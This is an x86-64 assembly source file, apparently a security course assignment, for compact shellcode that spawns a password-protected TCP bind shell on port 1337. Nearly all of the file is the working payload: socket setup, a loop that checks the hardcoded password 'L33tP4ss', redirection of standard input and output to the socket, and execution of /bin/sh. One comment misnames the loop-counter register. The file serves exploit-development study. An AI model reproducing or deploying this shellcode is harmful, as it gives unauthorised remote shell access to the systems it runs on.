; Author :      Demey Alexandre (PA-14186)
; Date :        01-06-2020
; 
; Description : SLAE assignment #1 - Shell bind tcp with password
;               Spawn a tcp bind shell on port 1337 asking for password "L33tP4ss"
;
; Shellcode length : 110 bytes

global _start

section .text

_start:

   ; socket(AF_INET, SOCK_STREAM, 0)  
   xor edi, edi                 ; Like we have seen in the course and from 
			        ; Intel® 64 and IA-32 Architectures Developer's Manual: Vol. 1 :
			        ; "32-bit operands generate a 32-bit result, zero-extended to a 64-bit result"
			        ; so xor edi, edi is the same as xor rdi,rdi but shorter, and that is good for us
			      
   mul edi                      ; RAX, RDX, RDI set to 0
   inc edi              
   mov esi, edi                 ; SOCK_STREAM
   inc edi                      ; AF_INET
   mov al, 41               	; socket syscall value
   syscall                  	; exec syscall

   ; bind(sockfd, {INADDR_ANY, 1337, AF_INET}, 16)
   mov ebx, edx			; we save a 0
   push rdx			; INADDR_ANY (0.0.0.0)
   push word 0x3905		; port 1337
   push di 			; AF_INET
   mov edi, eax			; sockfd
   mov rsi, rsp			; RSI point to the sockaddr struct
   mov dl, 0x10			; addrlen
   mov al, 49			; bind syscall value
   syscall                  	; exec syscall

   ; listen(sockfd, 0) 
   mov esi, ebx			; 0 for no queue
				; RDI already set to sockfd
   mov al, 50			; listen syscall value
   syscall			; exec syscall

   ; accept(sockfd, null, null)
   cdq				; RDX set to null pointer
				; RSI already set to null pointer
				; RDI already set to sockfd
   mov al, 43			; accept syscall value
   syscall                  	; exec syscall

   xchg eax, edi		; copy the new sockfd into RDI

try_pass:
   ;read(int fd, void *buf, size_t count);
   mov rsi, rsp			; RSI point to the stack, to write the password
   mov dl, 8			; number of bytes to read from sockfd and write to RSI address
   mov eax, ebx			; read syscall value
   syscall                  	; exec syscall

   xchg rdi, rsi		; copy user password address to RDI and keep sockfd in RSI
   mov rax, 0x737334507433334c  ; L33tP4ss
   scasq			; compare 8 bytes from RAX with 8 bytes from RDI
   xchg rdi, rsi		; reset RDI to sockfd value
   jnz try_pass		        ; if ZF not set RAX/RDI were different (Bad password, so retry)

   mov esi, ebx			; RSI set to 0
   xchg eax, ebx		; RAX set to 0
   add esi, 3			; dup2 counter initialized

dup:
   ; dup2(sockfd, stdio)
   dec esi			; starting with stderr(2) to stdin(0)
				; RDI already set to sockfd
   mov al, 33			; dup2 syscall value
   syscall			; exec syscall
   jnz dup			; if RCX != 0 we need to confinue

   ; execve("/bin/sh", null, null)
   push rax			; string terminator
   mov al, 59			; execve syscall value
   mov rdi, 0x68732f2f6e69622f  ; "/bin//sh"
   push rdi			
   mov rdi, rsp			; RDI point to "/bin//sh"
        			; RSI already set to null pointer
   cdq				; RDX set to null pointer
   syscall                  	; exec syscall
